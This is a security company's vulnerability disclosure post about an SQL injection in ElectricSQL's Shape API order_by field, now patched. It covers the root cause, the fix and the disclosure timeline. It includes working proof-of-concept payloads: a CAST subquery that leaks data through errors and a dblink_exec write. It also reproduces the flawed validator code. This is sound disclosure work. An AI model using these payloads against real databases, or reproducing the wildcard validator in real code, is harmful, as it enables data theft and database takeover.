---
schema_version: "1.0.0"
document_id: "f3ea6e169819672ed360bc971ee3fd3424f833a9f32a255a566246deab723c75"
company_key: "yc-casco"
company: "Casco"
source_id: "yc-casco-news-import-3e4503ef629e"
canonical_url: "https://casco.com/blog/electricsql-order-by-sql-injection"
published_at: "2026-04-13T19:00:00+00:00"
first_seen_at: "2026-07-21T12:40:29.812234+00:00"
fetched_at: "2026-07-28T21:25:38.770750+00:00"
content_hash: "sha256:728708cf0a20a66156da060bbda6e63ae8fe789b8ec01c535692e7eaf46ac40f"
---

# Vulnerability Disclosure: Database Takeover in ElectricSQL Rene Brandel Mon Apr 13 2026

# Vulnerability Disclosure: Database Takeover in ElectricSQL


Written by


[Rene Brandel](https://linkedin.com/in/renebrandel)


on


Mon Apr 13 2026


*Disclaimer: The vulnerability discussed in this post was responsibly disclosed to the ElectricSQL team. The issue has been addressed and is no longer exploitable.*


This post is about what happens when you report a critical vulnerability to the right team. From initial disclosure to full cloud deployment: **2 hours** .


## The Discovery


During an authorized security assessment for a customer, we identified a SQL injection vulnerability in[ElectricSQL](https://electric-sql.com/) 's Shape API. The` order_by` parameter was vulnerable to error-based SQL injection, allowing any authenticated user to read, write, and destroy the full contents of the underlying PostgreSQL database.


## The Vulnerability


ElectricSQL's Shape API lets clients subscribe to subsets of database tables. When you request a shape, you can pass an` order_by` field in the JSON body to control how results are sorted. A legitimate request might look like:


```text
curl   -X   POST   "https://<host>/v1/shapes?table=items"   \
-H   "Content-Type: application/json"   \
-d   '{"order_by": "created_at DESC"}'
```


This gets transformed into a SQL query like:


```text
SELECT   *   FROM   items   ORDER BY   created_at   DESC
```


Simple enough. But what if instead of` created_at DESC` , an attacker sends:


```text
order_by=CAST((SELECT password FROM users LIMIT 1) AS int) DESC
```


Now the query becomes:


```text
SELECT   *   FROM   items   ORDER BY   CAST  ((  SELECT   password   FROM   users   LIMIT   1  )   AS   int  )   DESC
```


PostgreSQL tries to cast a password string to an integer, fails, and helpfully returns the actual password value in the error message. That's the vulnerability: user input flowing directly into SQL without proper validation.


### The Root Cause


The` Parser.validate_order_by` function in ElectricSQL wraps user-supplied` order_by` input in` SELECT 1 ORDER BY #{order_by}` and walks the resulting AST with` check_valid_refs` . This function had three clauses: one for` ColumnRef` , one for` ParamRef` , and a catch-all wildcard:


```text
defp   check_valid_refs  (  _  ,   _  ,   _  ),   do:   {  :ok  ,   :ok  }
```


This wildcard silently accepted all other AST node types, including` TypeCast` ,` SubLink` ,` FuncCall` ,` CaseExpr` , and` A_Expr` . Because the validated raw user string was then concatenated directly into the SQL query, arbitrary SQL expressions passed through to PostgreSQL.


That behavior was first introduced on **October 2, 2025** with the[@core/sync-service@1.1.12](https://github.com/electric-sql/electric/releases/tag/%40core%2Fsync-service%401.1.12) release.


ElectricSQL · Shape API · order_by validation flow


Request


IN


GET /v1/shape?table=items&order_by=...


```text
order_by: "CAST((SELECT version()) AS int) DESC"
```


Parse


PASS


pg_query parses order_by into AST


```text
SELECT 1 ORDER BY CAST((SELECT version()) AS int) DESC
```


Validate


DANGER


check_valid_refs walks AST — TypeCast hits catch-all wildcard


```text
# Vulnerable code
defp check_valid_refs(%{node: {:column_ref, _}}, _, _), do: {:ok, :ok}
defp check_valid_refs(%{node: {:param_ref, _}}, _, _),  do: {:ok, :ok}
defp check_valid_refs(_, _, _),                          do: {:ok, :ok}
#                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                    TypeCast, SubLink, FuncCall all pass through here
```


Execute


DANGER


Raw user string concatenated into SQL — injection succeeds


```text
SELECT ... FROM items ORDER BY CAST((SELECT version()) AS int) DESC
-- PostgreSQL error leaks data:
-- "invalid input syntax for type integer: \"PostgreSQL 16.x on ...\""
```


VULNERABLE


electric-sql/electric · prior to commit 61c64bb


## Impact


Through error-based extraction, a malicious actor could read every row of every table in the database. With` dblink_exec()` , the same injection point supports:


- **Data exfiltration** : Extract sensitive data row-by-row
- **Data modification** : Insert, update, or delete records in any table
- **Privilege escalation** : Create superuser roles for persistent access
- **Denial of service** : Use` pg_sleep()` to tie up database connections


Any application using ElectricSQL with application-level tenant isolation is affected. A user in one tenant could access, modify, or destroy data belonging to any other tenant.


## Proof of Concept


**Reading data (error-based extraction):**


```text
curl   -X   POST   "https://<electric-sync-host>/v1/shapes?table=<table_name>"   \
-H   "Content-Type: application/json"   \
-H   "Authorization: Bearer <valid_auth_token>"   \
-d   '{
"order_by": "CAST((SELECT version()) AS int) DESC"
}'
```


PostgreSQL attempts the invalid type cast and returns the queried value in the error message:


```text
{
"error"  :   "invalid input syntax for type integer:   \"  PostgreSQL 16.x on ...  \"  "
}
```


**Writing data (via dblink_exec):**


```text
curl   -X   POST   "https://<electric-host>/v1/shape?table=test_items"   \
-H   "Content-Type: application/json"   \
-d   '{
"order_by": "CAST((SELECT dblink_exec('  \'  'dbname=electric'  \'  ', '  \'  'INSERT INTO test_items(name) VALUES (...)'  \'  ''  \'  ')) AS int) DESC"
}'
```


For the full catalog of PoC examples including privilege escalation and DoS vectors, see the[GitHub security advisory](https://github.com/electric-sql/electric/security/advisories/GHSA-h5rg-pxx7-r2hj) .


## The Fix


The ElectricSQL team added explicit handlers for dangerous AST node types:


```text
defp   check_valid_refs  (%{  node:   {  :type_cast  ,   _  }},   _  ,   _  ),
do:   {  :error  ,   "Type casts not allowed"  }


defp   check_valid_refs  (%{  node:   {  :sub_link  ,   _  }},   _  ,   _  ),
do:   {  :error  ,   "Subqueries not allowed"  }


defp   check_valid_refs  (%{  node:   {  :func_call  ,   _  }},   _  ,   _  ),
do:   {  :error  ,   "Function calls not allowed"  }
```


View the complete fix:[electric-sql/electric@61c64bb](https://github.com/electric-sql/electric/commit/61c64bb64dc7398d4e31fa9698210ab18512e93c)


## Disclosure Timeline


- **\[2025-10-02\]:** Vulnerable` order_by` handling shipped in[@core/sync-service@1.1.12](https://github.com/electric-sql/electric/releases/tag/%40core%2Fsync-service%401.1.12) .
- **\[2026-04-02 4:15 PM UTC\]:** Vulnerability reported by Casco.
- **\[2026-04-02 5:39 PM UTC\]:** Electric 1.5.0 released with fix (84 minutes).
- **\[2026-04-02 6:20 PM UTC\]:** Deployed Electric 1.5.0 to all Cloud instances (125 minutes total).
- **\[2026-04-14\]:** Public advisory published.


This is what good incident response looks like. The ElectricSQL team shipped a fix in 84 minutes and had it deployed across all cloud instances in just over 2 hours. We commend their security team for taking this seriously and acting decisively.


*Casco performs always-on autonomous security testing on web apps, APIs, infrastructure, and AI systems.[Book a demo](https://casco.com/book) to discover similar issues before they are exploited.*
